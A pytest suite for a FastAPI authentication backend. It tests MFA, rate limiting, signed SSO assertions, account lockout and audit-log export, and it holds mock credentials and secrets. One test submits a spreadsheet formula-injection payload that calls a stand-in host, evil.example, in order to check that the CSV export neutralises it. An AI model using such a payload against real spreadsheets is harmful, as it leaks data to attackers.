import pytest
import csv
import io
from fastapi import HTTPException
from fastapi.testclient import TestClient

from app.core import config as app_config
from app.database import SessionLocal
from app.main import app
from app.services import mfa_service
from app.services.rate_limit_service import (
    MFA_ABUSE,
    LOGIN_BRUTE_FORCE,
    RATE_LIMIT_EXCEEDED,
    check_rate_limit,
)
from datetime import datetime, timedelta, timezone
from app.models.auth_audit_logs import AuthAuditLog
from app.models.users import User
from app.services import rate_limit_service
from app.services.abuse_dashboard_service import get_abuse_dashboard

client = TestClient(app)

ANALYST = {"username": "analyst@company.com", "password": "analyst@1234"}
CEO = {"username": "ceo@company.com", "password": "ceocompany@123"}
SUPPLIER = {"username": "supplier@company.com", "password": "supplier@123"}


def _token(creds):
    r = client.post("/api/v1/auth/login", data=creds)
    assert r.status_code == 200, r.text
    return r.json()["access_token"]


@pytest.fixture
def mfa_on(monkeypatch):
    monkeypatch.setattr(app_config, "MFA_ENABLED", True)
    monkeypatch.setattr(app_config, "MFA_MOCK_OTP", "246810")


@pytest.fixture
def sso_on(monkeypatch):
    monkeypatch.setattr(app_config, "MOCK_SSO_ENABLED", True)
    monkeypatch.setattr(app_config, "MOCK_SSO_SECRET",  "test-sso-secret-0123456789abcdef-xyz",)

def _export(admin_token):
    r = client.get(
        "/api/v1/admin/audit/export",
        headers={"Authorization": f"Bearer {admin_token}"},
    )
    assert r.status_code == 200
    return r.text


# ---------------- MFA ----------------

def test_login_without_mfa_still_returns_tokens():
    r = client.post("/api/v1/auth/login", data=ANALYST)
    assert r.status_code == 200
    assert "access_token" in r.json()


def test_mfa_end_to_end_and_audited(monkeypatch):
    admin = _token(CEO)                       # before MFA is switched on
    monkeypatch.setattr(app_config, "MFA_ENABLED", True)
    monkeypatch.setattr(app_config, "MFA_MOCK_OTP", "246810")

    r = client.post("/api/v1/auth/login", data=ANALYST)
    assert r.json()["mfa_required"] is True
    challenge = r.json()["challenge_id"]

    wrong = client.post("/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "000000"})
    assert wrong.status_code == 401

    ok = client.post("/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "246810"})
    assert ok.status_code == 200
    assert "access_token" in ok.json()

    reuse = client.post("/api/v1/auth/mfa/verify", json={"challenge_id": challenge, "otp": "246810"})
    assert reuse.status_code == 401

    csv_text = _export(admin)
    assert "MFA_VERIFIED" in csv_text
    assert "MFA_FAILED" in csv_text


def test_challenge_destroyed_after_max_wrong_attempts(mfa_on):
    challenge_id, _ = mfa_service.create_mfa_challenge(user_id=1)

    for _ in range(mfa_service.MAX_OTP_ATTEMPTS):
        assert mfa_service.verify_mfa_challenge(challenge_id, "000000") is None

    # Correct OTP no longer works: the challenge is gone.
    assert mfa_service.verify_mfa_challenge(challenge_id, "246810") is None


def test_otp_is_random_when_no_mock_otp(monkeypatch):
    monkeypatch.setattr(app_config, "MFA_MOCK_OTP", None)
    otps = {mfa_service.create_mfa_challenge(user_id=1)[1] for _ in range(20)}
    assert len(otps) > 1


# ---------------- Rate limiting ----------------

def test_rate_limit_is_per_ip_not_global():
    db = SessionLocal()
    try:
        kwargs = dict(db=db, endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)

        for _ in range(5):
            check_rate_limit(ip_address="10.0.0.1", **kwargs)

        with pytest.raises(HTTPException) as exc:
            check_rate_limit(ip_address="10.0.0.1", **kwargs)
        assert exc.value.status_code == 429

        # A different client is NOT affected.
        check_rate_limit(ip_address="10.0.0.2", **kwargs)
    finally:
        db.close()


# ---------------- SSO ----------------

def test_sso_accepts_signed_assertion_and_is_audited(sso_on):
    from app.services.sso_service import create_mock_sso_assertion

    admin = _token(CEO)
    r = client.post(
        "/api/v1/auth/sso/login",
        json={"provider": "mock-enterprise-sso", "assertion": create_mock_sso_assertion("enterprise-002")},
    )
    assert r.status_code == 200
    assert r.json()["auth_type"] == "federated-sso"
    assert "SSO_LOGIN" in _export(admin)


def test_sso_rejects_assertion_signed_with_wrong_secret(sso_on, monkeypatch):
    from app.services.sso_service import create_mock_sso_assertion

    forged = create_mock_sso_assertion("enterprise-001")
    monkeypatch.setattr(app_config, "MOCK_SSO_SECRET", "different-sso-secret-0123456789abcdef")

    r = client.post("/api/v1/auth/sso/login", json={"provider": "mock-enterprise-sso", "assertion": forged})
    assert r.status_code == 401


def test_sso_rejects_plain_client_fields():
    # The old request shape (email/full_name/external_id) must not work.
    r = client.post(
        "/api/v1/auth/sso/login",
        json={
            "provider": "mock-enterprise-sso",
            "email": "ceo@company.com",
            "full_name": "CEO User",
            "external_id": "enterprise-001",
        },
    )
    assert r.status_code in (404, 422)


def test_sso_disabled_by_default():
    r = client.post("/api/v1/auth/sso/login", json={"provider": "mock-enterprise-sso", "assertion": "x"})
    assert r.status_code == 404

def test_sso_refuses_blank_secret(monkeypatch):
    monkeypatch.setattr(app_config, "MOCK_SSO_ENABLED", True)
    monkeypatch.setattr(app_config, "MOCK_SSO_SECRET", "")
    from jose import jwt
    forged = jwt.encode(
        {"iss": "mock-enterprise-sso", "aud": "eaicsp-platform", "sub": "x",
         "email": "ceo@company.com", "exp": 9999999999},
        "", algorithm="HS256",
    )
    r = client.post("/api/v1/auth/sso/login", json={"provider": "mock-enterprise-sso", "assertion": forged})
    assert r.status_code == 503

def test_env_example_does_not_ship_a_usable_sso_secret():
    from pathlib import Path

    env_example = Path(__file__).resolve().parents[1] / ".env.example"
    for line in env_example.read_text(encoding="utf-8").splitlines():
        if line.startswith("MOCK_SSO_SECRET="):
            # Must be blank so the startup check forces a real secret.
            assert line.split("=", 1)[1].strip() == ""
            
# ---------------- Audit export / abuse dashboard ----------------

def test_audit_export_has_compliance_columns():
    header = _export(_token(CEO)).splitlines()[0]
    assert header == "timestamp,actor_id,actor_email,action,outcome,ip_address,details"


def test_supplier_cannot_export_or_view_abuse_dashboard():
    token = _token(SUPPLIER)
    headers = {"Authorization": f"Bearer {token}"}

    assert client.get("/api/v1/admin/audit/export", headers=headers).status_code == 403
    assert client.get("/api/v1/admin/abuse/dashboard", headers=headers).status_code == 403

def test_audit_export_limit_is_applied():
    admin = _token(CEO)
    _token(CEO)  # at least two audit rows
    r = client.get("/api/v1/admin/audit/export?limit=1", headers={"Authorization": f"Bearer {admin}"})
    assert len(r.text.strip().splitlines()) == 2   # header + 1 row


def test_audit_export_json_format():
    admin = _token(CEO)
    r = client.get("/api/v1/admin/audit/export?output_format=json", headers={"Authorization": f"Bearer {admin}"})
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("application/json")
    assert {"timestamp", "actor_email", "action", "outcome"} <= set(r.json()[0])


def _set_locked_until(email, value):
    db = SessionLocal()
    try:
        user = db.query(User).filter(User.email == email).first()
        user.locked_until = value
        db.commit()
    finally:
        db.close()


def test_locked_user_with_valid_token_gets_401_not_500():
    token = _token(ANALYST)
    _set_locked_until(ANALYST["username"], datetime.now(timezone.utc) + timedelta(minutes=15))
    try:
        r = client.get("/api/v1/users/me", headers={"Authorization": f"Bearer {token}"})
        assert r.status_code == 401
    finally:
        _set_locked_until(ANALYST["username"], None)


def test_sso_refuses_a_locked_account(sso_on):
    from app.services.sso_service import create_mock_sso_assertion

    _set_locked_until("vpoperations@company.com", datetime.now(timezone.utc) + timedelta(minutes=15))
    try:
        r = client.post(
            "/api/v1/auth/sso/login",
            json={"provider": "mock-enterprise-sso", "assertion": create_mock_sso_assertion("enterprise-002")},
        )
        assert r.status_code == 401
    finally:
        _set_locked_until("vpoperations@company.com", None)


def test_changing_caller_header_does_not_reset_the_limit():
    db = SessionLocal()
    try:
        kwargs = dict(db=db, ip_address="10.9.9.9", endpoint="/api/v1/auth/verify")

        # 100 requests, each claiming to be a different, made-up service.
        for i in range(100):
            check_rate_limit(caller_service=f"fake-service-{i}", **kwargs)

        with pytest.raises(HTTPException) as exc:
            check_rate_limit(caller_service="yet-another-fake", **kwargs)
        assert exc.value.status_code == 429

        # A known service still has its own bucket on the same IP.
        check_rate_limit(caller_service="inventory-service", **kwargs)
    finally:
        db.close()


def test_rejected_requests_write_one_audit_row_per_window():
    db = SessionLocal()
    ip = "10.8.8.8"
    try:
        kwargs = dict(db=db, ip_address=ip, endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
        for _ in range(5):
            check_rate_limit(**kwargs)

        for _ in range(10):  # ten rejected requests in the same window
            with pytest.raises(HTTPException):
                check_rate_limit(**kwargs)

        rows = (
            db.query(AuthAuditLog)
            .filter(AuthAuditLog.event_type == RATE_LIMIT_EXCEEDED, AuthAuditLog.ip_address == ip)
            .count()
        )
        assert rows == 1
    finally:
        db.close()


def test_login_brute_force_shows_on_abuse_dashboard():
    db = SessionLocal()
    ip = "10.7.7.7"
    try:
        kwargs = dict(db=db, ip_address=ip, endpoint="/api/v1/auth/login", abuse_event_type=LOGIN_BRUTE_FORCE)
        for _ in range(20):
            check_rate_limit(**kwargs)
        with pytest.raises(HTTPException):
            check_rate_limit(**kwargs)

        dashboard = get_abuse_dashboard(db)

        assert dashboard["rate_limit_violations_by_type"][LOGIN_BRUTE_FORCE] >= 1
        assert dashboard["rate_limit_violations"] >= 1
        assert any(entry["ip_address"] == ip for entry in dashboard["top_ips"])
        assert any(entry["endpoint"] == "/api/v1/auth/login" for entry in dashboard["top_endpoints"])
    finally:
        db.close()


def test_login_request_does_not_clear_an_active_mfa_bucket(monkeypatch):
    """Idle-bucket cleanup must use the longest window (300s MFA), not 60s."""
    start = datetime(2026, 1, 1, 12, 0, tzinfo=timezone.utc)
    clock = {"now": start}

    class FakeDateTime(datetime):
        @classmethod
        def now(cls, tz=None):
            return clock["now"]

    monkeypatch.setattr(rate_limit_service, "datetime", FakeDateTime)

    db = SessionLocal()
    try:
        mfa = dict(db=db, ip_address="10.6.6.6", endpoint="/api/v1/auth/mfa/verify", abuse_event_type=MFA_ABUSE)
        for _ in range(5):
            check_rate_limit(**mfa)

        clock["now"] = start + timedelta(seconds=120)  # still inside MFA's 300s window
        check_rate_limit(db=db, ip_address="10.6.6.7", endpoint="/api/v1/auth/login")

        with pytest.raises(HTTPException) as exc:
            check_rate_limit(**mfa)
        assert exc.value.status_code == 429
    finally:
        db.close()


def test_audit_export_csv_neutralises_formulas():
    from app.services.audit_export_service import export_audit_logs

    # A failed login stores the raw username the attacker typed.
    payload = '=HYPERLINK("http://evil.example/?"&A1,"x")'
    client.post("/api/v1/auth/login", data={"username": payload, "password": "wrong-password"})

    db = SessionLocal()
    try:
        csv_text = export_audit_logs(db, event_type="LOGIN_FAILED", limit=5000)
    finally:
        db.close()

    cells = [cell for row in csv.reader(io.StringIO(csv_text)) for cell in row]

    # Exported as text ('=...), never as a live formula.
    # (Login lower-cases the username before it is audited.)
    assert "'" + payload.lower() in cells
    assert not any(cell.startswith(("=", "+", "-", "@")) for cell in cells)
